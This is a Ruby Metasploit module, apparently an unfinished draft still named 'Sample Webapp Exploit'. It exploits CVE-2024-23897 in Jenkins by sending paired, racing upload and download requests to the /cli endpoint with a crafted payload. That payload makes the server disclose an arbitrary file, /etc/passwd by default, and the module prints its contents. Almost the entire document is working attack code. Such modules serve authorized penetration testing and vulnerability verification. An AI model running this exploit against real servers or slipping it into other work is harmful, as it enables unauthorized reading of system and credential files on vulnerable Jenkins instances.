##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        # The Name should be just like the line of a Git commit - software name,
        # vuln type, class. Preferably apply
        # some search optimization so people can actually find the module.
        # We encourage consistency between module name and file name.
        'Name' => 'Sample Webapp Exploit',
        'Description' => %q{
          docker run -p 8080:8080 -p 50000:50000 jenkins/jenkins:2.440-jdk17
        },
        'License' => MSF_LICENSE,
        # The place to add your name/handle and email.  Twitter and other contact info isn't handled here.
        # Add reference to additional authors, like those creating original proof of concepts or
        # reference materials.
        # It is also common to comment in who did what (PoC vs metasploit module, etc)
        'Author' => [
          'h00die', # msf module
          'Yaniv Nizry' # discovery
        ],
        'References' => [
          [ 'URL', 'https://www.jenkins.io/security/advisory/2024-01-24/'],
          [ 'URL', 'https://www.sonarsource.com/blog/excessive-expansion-uncovering-critical-security-vulnerabilities-in-jenkins/'],
          [ 'URL', 'https://github.com/binganao/CVE-2024-23897'],
          [ 'URL', 'https://github.com/h4x0r-dz/CVE-2024-23897'],
          [ 'URL', 'https://github.com/Vozec/CVE-2024-23897'],
          [ 'CVE', '2024-23897']
        ],
        # from lib/msf/core/module/privileged, denotes if this requires or gives privileged access
        'Privileged' => false,
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2024-01-24',
        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
        # It's generally easiest just to put the default at the beginning of the list and skip this
        # entirely.
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ ],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'DefaultOptions' => {
          'RPORT' => 8080
        }
      )
    )
    # set the default port, and a URI that a user can set if the app isn't installed to the root
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Jenkins', '/']),
        OptString.new('FILE_PATH', [true, 'File path to read from the server', '/etc/passwd']),
      ]
    )
  end

  # Returns the Jenkins version. taken from jenkins_cred_recovery.rb
  #
  # @return [String] Jenkins version.
  # @return [NilClass] No Jenkins version found.
  def get_jenkins_version
    uri = normalize_uri(target_uri.path)
    res = send_request_cgi({ 'uri' => uri })

    unless res
      fail_with(Failure::Unknown, 'Connection timed out while finding the Jenkins version')
    end

    html = res.get_html_document
    version_attribute = html.at('body').attributes['data-version']
    version = version_attribute ? version_attribute.value : ''
    version.scan(/jenkins-([\d.]+)/).flatten.first
  end

  # Returns a check code indicating the vulnerable status. taken from jenkins_cred_recovery.rb
  #
  # @return [Array] Check code
  def check
    version = get_jenkins_version
    vprint_status("Found version: #{version}")

    # Default version is vulnerable, but can be mitigated by refusing anonymous permission on
    # decryption API. So a version wouldn't be adequate to check.
    if version
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end

  def upload_request(uuid)
    # send upload request asking for file
    Rex::ThreadSafe.sleep(0.01) # this sleep seems to be the magic to get the download request to hit very slightly ahead of the upload request
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'cli'),
      'method' => 'POST',
      'keep_cookies' => true,
      'ctype' => 'application/octet-stream',
      'headers' => {
        'Session' => uuid,
        'Side' => 'upload'
        # "Content-type": "application/octet-stream"
      },
      'vars_get' => {
        'remoting' => 'false'
      },
      # https://github.com/h4x0r-dz/CVE-2024-23897/blob/main/CVE-2024-23897.py#L45C13-L45C187
      'data' => "\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x0e\x00\x00\x0c@#{datastore['FILE_PATH']}\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05en_US\x00\x00\x00\x00\x03"
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid server reply to upload request (response code: #{res.code})") unless res.code == 200
    # we don't get a response here, so we just need the request to go through and 200 us
  end

  def process_result
    file_contents = []
    @content_body.split("\n").each do |html_response_line|
      # filter for the two lines which have output
      if html_response_line.include? 'ERROR: Too many arguments'
        file_contents << html_response_line.gsub('ERROR: Too many arguments: ', '').strip
      elsif html_response_line.include? 'COMMAND : Name of the command (default:'
        temp = html_response_line.gsub(' COMMAND : Name of the command (default: ', '')
        temp = temp.chomp(')').strip
        file_contents.insert(0, temp)
      end
    end
    return if file_contents.empty?

    print_good("#{datastore['FILE_PATH']} file contents:\n#{file_contents.join("\n")}")
  end

  def download_request(uuid)
    # send download request
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'cli'),
      'method' => 'POST',
      'keep_cookies' => true,
      'headers' => {
        'Session' => uuid,
        'Side' => 'download'
      },
      'vars_get' => {
        'remoting' => 'false'
      }
    )

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid server reply to download request (response code: #{res.code})") unless res.code == 200

    @content_body = res.body
  end

  def run
    uuid = SecureRandom.uuid

    print_status("Sending requests with UUID: #{uuid}")
    threads = []
    threads << framework.threads.spawn('CVE-2024-23897', false) do
      upload_request(uuid)
    end
    threads << framework.threads.spawn('CVE-2024-23897', false) do
      download_request(uuid)
    end

    threads.map do |t|
      t.join
    rescue StandardError
      nil
    end
    if @content_body
      process_result
    else
      print_bad('Exploit failed, no exploit data was successfully returned')
    end
  end
end
